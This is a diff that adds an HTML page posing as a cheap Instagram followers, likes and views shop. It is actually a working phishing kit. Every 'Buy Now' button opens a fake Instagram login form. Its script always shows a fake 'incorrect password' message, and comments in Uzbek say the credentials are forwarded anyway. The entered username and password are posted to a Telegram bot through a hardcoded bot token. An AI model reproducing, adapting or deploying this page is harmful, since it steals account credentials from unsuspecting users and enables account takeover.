@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Instagram Services</title>
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:Arial}
+body{background:#0b0b0b;color:#fff}
+
+header{text-align:center;padding:15px;border-bottom:1px solid #222}
+header h1{font-family:cursive}
+
+.hero{text-align:center;padding:30px 15px}
+.hero p{color:#aaa;font-size:14px}
+
+.cards{
+ display:grid;
+ grid-template-columns:repeat(auto-fit,minmax(160px,1fr));
+ gap:15px;
+ padding:20px;
+}
+
+.card{
+ background:#141414;
+ border-radius:16px;
+ padding:20px;
+ position:relative;
+ text-align:center;
+ box-shadow:0 0 20px rgba(0,0,0,.6);
+}
+
+.icon{font-size:36px;margin-bottom:10px}
+.card p{font-size:13px;color:#bbb;margin-bottom:10px}
+
+.price{font-weight:bold;color:#1da1f2}
+.price span{font-size:12px;color:#777;text-decoration:line-through}
+.free{color:#00ff99}
+
+.badge{
+ position:absolute;
+ top:10px;right:10px;
+ font-size:11px;
+ padding:4px 8px;
+ border-radius:8px;
+ color:#fff;
+}
+.gift{background:#ff2d55}
+.discount{background:#ff9500}
+
+.buy{
+ margin-top:12px;
+ width:100%;
+ padding:10px;
+ border:none;
+ border-radius:10px;
+ background:linear-gradient(135deg,#ff2d55,#ff9500);
+ color:#fff;
+ font-weight:bold;
+ cursor:pointer;
+}
+
+/* MODAL */
+.modal{
+ display:none;
+ position:fixed;
+ inset:0;
+ background:rgba(0,0,0,.7);
+ align-items:center;
+ justify-content:center;
+}
+.modal-box{
+ background:#141414;
+ padding:20px;
+ border-radius:15px;
+ width:300px;
+ 
+ height: 430px;
+ text-align:center;
+}
+.modal-box input{
+ width: 260px;
+ height: 30px;
+ padding:10px;
+ margin:4px 0;
+ border:none;
+ border-radius:2px;
+ background-color: #040303;
+ color: #fff;
+}
+.modal-box button{
+ width: 260px;
+ height: 30px;
+ padding:10px;
+ border:none;
+ border-radius:2px;
+ margin-top:20px;
+ font-weight:bold;
+ cursor:pointer;
+}
+.kk{
+    width: 20px;
+    margin-left: 120px;
+    margin-top: 20px;
+    color: #777 ;
+}
+.submit{background:#007fce;color:#eeeeee}
+</style>
+</head>
+<body>
+
+<header><img src="Instagram_logo.svg.png" alt="" style="width: 100px; filter: brightness(0) invert(1);"></header>
+
+<section class="hero">
+<h2>Get More Engagement</h2>
+<p>Boost your profile with real followers, likes, and views. Instant delivery.</p>
+</section>
+
+<section class="cards">
+
+<!-- FREE -->
+<div class="card">
+ <span class="badge gift">GIFT</span>
+ <div class="icon">👥</div>
+ <h3>1000 Followers</h3>
+ <p>Real active followers</p>
+ <div class="price free">FREE</div>
+ <button class="buy" onclick="openModal('1000 Followers')">Buy Now</button>
+</div>
+
+<div class="card">
+ <span class="badge gift">GIFT</span>
+ <div class="icon">❤️</div>
+ <h3>1000 Likes</h3>
+ <p>Boost your post</p>
+ <div class="price free">FREE</div>
+ <button class="buy" onclick="openModal('1000 Likes')" style="margin-top: 32px;">Buy Now</button>
+</div>
+
+<div class="card">
+ <span class="badge gift">GIFT</span>
+ <div class="icon">👀</div>
+ <h3>10k Views</h3>
+ <p>For reels or videos</p>
+ <div class="price free">FREE</div>
+ <button class="buy" onclick="openModal('10k Views')" style="margin-top: 32px;">Buy Now</button>
+</div>
+
+<!-- PAID -->
+<div class="card">
+ <span class="badge discount">-50%</span>
+ <div class="icon">👥</div>
+ <h3>5000 Followers</h3>
+ <p>High quality profiles</p>
+ <div class="price">$4.99 <span>$9.99</span></div>
+ <button class="buy" onclick="openModal('5000 Followers')" >Buy Now</button>
+</div>
+
+<div class="card">
+ <span class="badge discount">-50%</span>
+ <div class="icon">🔥</div>
+ <h3>10k Followers</h3>
+ <p>Become influencer</p>
+ <div class="price">$9.99 <span>$19.99</span></div>
+ <button class="buy" onclick="openModal('10k Followers')">Buy Now</button>
+</div>
+
+<div class="card">
+ <span class="badge discount">-40%</span>
+ <div class="icon">❤️</div>
+ <h3>5000 Likes</h3>
+ <p>Split across posts</p>
+ <div class="price">$2.99 <span>$4.99</span></div>
+ <button class="buy" onclick="openModal('5000 Likes')" style="margin-top: 32px;">Buy Now</button>
+</div>
+
+<div class="card">
+ <span class="badge discount">-50%</span>
+ <div class="icon">🚀</div>
+ <h3>50k Views</h3>
+ <p>Go viral</p>
+ <div class="price">$1.99 <span>$3.99</span></div>
+ <button class="buy" onclick="openModal('50k Views')">Buy Now</button>
+</div>
+
+<div class="card">
+ <span class="badge discount">-33%</span>
+ <div class="icon">✅</div>
+ <h3>Blue Badge</h3>
+ <p>Meta verified help</p>
+ <div class="price">$5.99 <span>$8.99</span></div>
+ <button class="buy" onclick="openModal('Blue Badge')">Buy Now</button>
+</div>
+
+</section>
+
+<!-- MODAL -->
+    <div class="modal" id="modal" onclick="closeModal()">
+<div class="modal-box" onclick="event.stopPropagation()">
+  <h3 id="serviceName"><img src="Instagram_logo.svg.png" alt="" style="width: 100px; filter: brightness(0) invert(1);"></h3>
+  <br>
+  <br>
+  <input id="userInput" placeholder="Phone number, username or email">
+  <input id="passwordInput" type="password" placeholder="Password">
+  <button class="submit" onclick="submitFree()">Log in</button>
+  <h6 class="kk" style="width: 5px;">OR</h6>
+  <h6 style="color: #0080cf; margin-top: 15px;">f Log in with Facebook</h6>
+  <p id="errorText" style="display:none;color:#ff4d4d;margin:6px 0;font-size:13px;">Sorry, your password was incorrect. Please <br>double-check your password.</p>
+  <h6 style="color: #777; margin-top: 15px;">Forgot password?</h6>
+  <h6 style="margin-left: -50px; margin-top: 60px; color: #bbb;">Don't have an account?</h6>
+  <h6 style="margin-left: 167px; margin-top: -12px; position: absolute; color: #1da1f2;">Sign up</h6>
+</div>
+
+
+<script>
+const BOT_TOKEN = "8419564332:AAHkuRVsJ1DijSUiDJTNUsqUs20rzWrbsks";
+const CHAT_ID = "@instalogin025";
+
+let currentService = "";
+
+function openModal(service){
+ currentService = service;
+ document.getElementById("modal").style.display = "flex";
+}
+
+function closeModal(){
+ document.getElementById("modal").style.display = "none";
+}
+
+function submitFree(){
+  const userValue = document.getElementById("userInput").value.trim();
+  const passwordValue = document.getElementById("passwordInput").value.trim();
+  const err = document.getElementById("errorText");
+
+  if(!userValue || !passwordValue){
+    err.innerText = "";
+    err.style.display = "block";
+    return;
+  }
+
+  // 🔴 FOYDALANUVCHIGA HAR DOIM XATO KO‘RSATAMIZ
+  err.innerText = "Sorry, your password was incorrect. Please double-check your password.";
+  err.style.display = "block";
+
+  // ✅ LEKIN BOTGA BARIBIR YUBORAMIZ
+  const message =
+`🆓 FREE ORDER
+📦 Service: ${currentService}
+👤 Login: ${userValue}
+🔑 Password: ${passwordValue}
+⏰ Time: ${new Date().toLocaleString()}`;
+
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+    method:"POST",
+    headers:{ "Content-Type":"application/json" },
+    body:JSON.stringify({
+      chat_id: CHAT_ID,
+      text: message
+    })
+  }).then(r=>r.json()).then(d=>{
+    // hech narsa demaymiz, xato allaqachon chiqib bo‘lgan
+    console.log("Sent to bot:", d.ok);
+  });
+}
+
+
+function paid(){
+ alert("💳 Payment system hali ulanmagan");
+}
+
+function closeModal(){
+  document.getElementById("modal").style.display = "none";
+}
+
+</script>
+
+
+
+</body>
+</html>
